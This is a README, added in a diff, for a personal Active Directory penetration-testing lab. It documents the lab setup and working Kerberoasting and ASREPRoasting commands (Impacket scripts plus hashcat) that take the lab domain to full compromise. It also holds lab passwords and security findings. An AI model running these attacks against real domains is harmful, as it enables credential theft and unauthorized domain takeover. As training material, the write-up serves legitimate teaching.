@@ -1,0 +1,303 @@
+# Active Directory Penetration Testing Lab
+
+## 📋 Project Overview
+
+Complete Active Directory lab setup demonstrating three major Kerberos-based attacks:
+- **LDAP Enumeration** - User and service account discovery
+- **Kerberoasting** - Service account password cracking
+- **ASREPRoasting** - Regular user password cracking
+
+**Status:** ✅ All attacks successfully demonstrated
+
+---
+
+## 🏗️ Lab Infrastructure
+
+### Virtual Machines
+- **DC01** (Windows Server 2022)
+  - Domain: `akshay.local`
+  - Role: Domain Controller
+  - Admin: Administrator (password hidden)
+  
+- **Kali Linux**
+  - Attack platform
+  - Enumeration and exploitation tools
+
+### Network Configuration
+- NAT network for secure testing
+- LDAP, DNS, Kerberos services running
+- Firewall disabled (lab environment only)
+
+---
+
+## 👥 Users & Accounts Created
+
+### Regular Users
+1. **Rahul Sharma** (rahul.sharma@akshay.local)
+   - OU: IT
+   - Group: IT-Team
+   - Status: Active
+
+2. **Priya Verma** (priya.verma@akshay.local)
+   - OU: Sales
+   - Group: Sales-Team
+   - Status: Active
+
+### Service Accounts
+1. **SQLService** (sqlservice@akshay.local)
+   - SPN: `MSSQLSvc/sqlserver.akshay.local:1433`
+   - Purpose: SQL Server service account
+   - Vulnerability: Weak password exploitable via Kerberoasting
+
+### Vulnerable Accounts
+1. **Vulnerable User** (vulnuser@akshay.local)
+   - Configuration: Pre-authentication disabled
+   - Vulnerability: Exploitable via ASREPRoasting
+   - Status: Successfully compromised
+
+---
+
+## 🔐 Security Groups
+
+### Built-in Groups
+- **Domain Admins**: Administrator, sqlservice, vulnuser
+- **Domain Users**: All domain users
+- **Administrators**: Local admin group
+
+### Custom Groups
+- **IT-Team**: Rahul Sharma
+- **Sales-Team**: Priya Verma
+- **Managers-Team**: (empty)
+
+---
+
+## 🎯 Attacks Demonstrated
+
+### 1. LDAP Enumeration
+
+**Purpose:** Discover users, groups, and service accounts
+
+**Commands Used:**
+```powershell
+# List all users
+Get-ADUser -Filter * -Properties Name, SamAccountName, userAccountControl
+
+# Identify service accounts
+Get-ADUser -Filter {servicePrincipalName -like "*"} -Properties servicePrincipalName
+
+# Find pre-auth disabled users
+Get-ADUser -Filter {userAccountControl -band 4194304}
+
+# List groups
+Get-ADGroup -Filter * | Select-Object Name
+```
+
+**Results:**
+- ✅ 5 users enumerated
+- ✅ 5+ groups discovered
+- ✅ 1 service account with SPN identified
+- ✅ 1 pre-auth disabled user found
+
+---
+
+### 2. Kerberoasting Attack
+
+**Target:** SQLService account with registered SPN
+
+**Attack Flow:**
+1. Service account enumeration via LDAP
+2. SPN discovery: `MSSQLSvc/sqlserver.akshay.local:1433`
+3. TGS ticket extraction from KDC
+4. Offline password cracking
+5. Domain Admin privileges escalation
+
+**Setup:**
+```powershell
+# Create service account
+New-ADUser -Name "SQLService" -SamAccountName "sqlservice" `
+  -UserPrincipalName "sqlservice@akshay.local" `
+  -Path "OU=IT,DC=akshay,DC=local" `
+  -AccountPassword (ConvertTo-SecureString -AsPlainText "SQLPass123" -Force) `
+  -Enabled $true
+
+# Register SPN
+setspn -A MSSQLSvc/sqlserver.akshay.local:1433 akshay.local\sqlservice
+```
+
+**Exploitation (from Kali):**
+```bash
+python3 ./examples/GetUserSPNs.py -request -dc-ip 192.168.56.101 akshay.local/rahul.sharma:Rahul@123
+hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+**Result:**
+- ✅ TGS ticket extracted
+- ✅ Password obtained: SQLPass123
+- ✅ Service account compromised
+- ✅ Added to Domain Admins group
+
+---
+
+### 3. ASREPRoasting Attack
+
+**Target:** Vulnerable User with pre-authentication disabled
+
+**Attack Flow:**
+1. Vulnerable user identification via LDAP
+2. Pre-auth disabled configuration verification
+3. TGT ticket extraction without password
+4. Weak encryption allows offline cracking
+5. Regular user to Domain Admin escalation
+
+**Setup:**
+```powershell
+# Create vulnerable user
+New-ADUser -Name "Vulnerable User" -SamAccountName "vulnuser" `
+  -UserPrincipalName "vulnuser@akshay.local" `
+  -Path "OU=IT,DC=akshay,DC=local" `
+  -AccountPassword (ConvertTo-SecureString -AsPlainText "VulnPass123" -Force) `
+  -Enabled $true
+
+# Disable pre-authentication (create vulnerability)
+Set-ADAccountControl -Identity "vulnuser" -DoesNotRequirePreAuth $true
+```
+
+**Exploitation (from Kali):**
+```bash
+python3 ./examples/GetNPUsers.py -request akshay.local/ -outputfile asrep_hashes.txt
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+**Result:**
+- ✅ TGT ticket obtained without password
+- ✅ Password cracked offline: VulnPass123
+- ✅ Regular user account compromised
+- ✅ Added to Domain Admins group
+
+---
+
+## 🏆 Complete Attack Chain
+
+```
+STAGE 1: Reconnaissance
+  └─ LDAP enumeration reveals users, groups, services
+  └─ Identify attack surface
+
+STAGE 2: Targeting
+  └─ Service account discovered (sqlservice with SPN)
+  └─ Pre-auth disabled user discovered (vulnuser)
+
+STAGE 3: Exploitation
+  ├─ Kerberoasting: Extract sqlservice TGS ticket
+  └─ ASREPRoasting: Extract vulnuser TGT ticket
+
+STAGE 4: Cracking
+  ├─ Hashcat: Crack TGS hash (TGS-REP)
+  └─ Hashcat: Crack TGT hash (AS-REP)
+
+STAGE 5: Compromise & Escalation
+  ├─ sqlservice → Domain Admin
+  ├─ vulnuser → Domain Admin
+  └─ Complete domain control achieved
+
+RESULT: 🎉 COMPLETE DOMAIN COMPROMISE
+  ✅ Domain Admin privileges obtained
+  ✅ Full network access achieved
+  ✅ Lateral movement possible
+  ✅ Persistence achievable
+```
+
+---
+
+## 📊 Lab Statistics
+
+| Metric | Count |
+|--------|-------|
+| Total Users | 5 |
+| Regular Users | 2 |
+| Service Accounts | 1 |
+| Vulnerable Accounts | 1 |
+| Security Groups | 5+ |
+| Compromised Accounts | 3 |
+| Domain Admins (after) | 3 |
+
+---
+
+## 🔒 Security Findings
+
+### Critical Vulnerabilities
+1. **Kerberoasting-Ready Service Account**
+   - Service account in Domain Admins
+   - Weak password (SQLPass123)
+   - SPN registered and discoverable
+   - Severity: **CRITICAL**
+
+2. **Pre-Authentication Disabled User**
+   - No password verification for TGT
+   - User escalated to Domain Admins
+   - Severity: **HIGH**
+
+3. **Poor Account Management**
+   - Regular users with admin privileges
+   - Service accounts over-privileged
+   - No monitoring or detection
+   - Severity: **CRITICAL**
+
+---
+
+## ✅ Objectives Completed
+
+- ✅ Active Directory domain created
+- ✅ Users and groups configured
+- ✅ Service accounts with SPN registered
+- ✅ Pre-auth disabled vulnerability created
+- ✅ LDAP enumeration performed
+- ✅ Kerberoasting attack executed
+- ✅ ASREPRoasting attack executed
+- ✅ Privilege escalation achieved
+- ✅ Complete domain compromise demonstrated
+
+---
+
+## 🚀 Skills Demonstrated
+
+- Active Directory administration
+- Kerberos protocol understanding
+- LDAP query techniques
+- Service Principal Name management
+- Impacket tool usage
+- Hashcat password cracking
+- PowerShell scripting
+- Attack methodology
+- Privilege escalation
+- Lab setup and configuration
+
+---
+
+## 📚 References
+
+- Microsoft Active Directory Documentation
+- Kerberos Protocol Specifications (RFC 1510)
+- MITRE ATT&CK Framework
+- Impacket GitHub Repository
+- HackTheBox & TryHackMe (learning platforms)
+
+---
+
+## ⚖️ Disclaimer
+
+This lab is for **educational purposes only** in a controlled environment. All demonstrations were performed with proper authorization. Unauthorized access to computer systems is illegal.
+
+---
+
+## 👤 Author
+
+Akshay Kumar Singh
+- Location: Bareilly, UP, India
+- Contact: akshay19bly@gmail.com
+
+---
+
+**Lab Status:** ✅ **COMPLETE & FULLY FUNCTIONAL**
+
+**Completion Date:** 19 July 2026
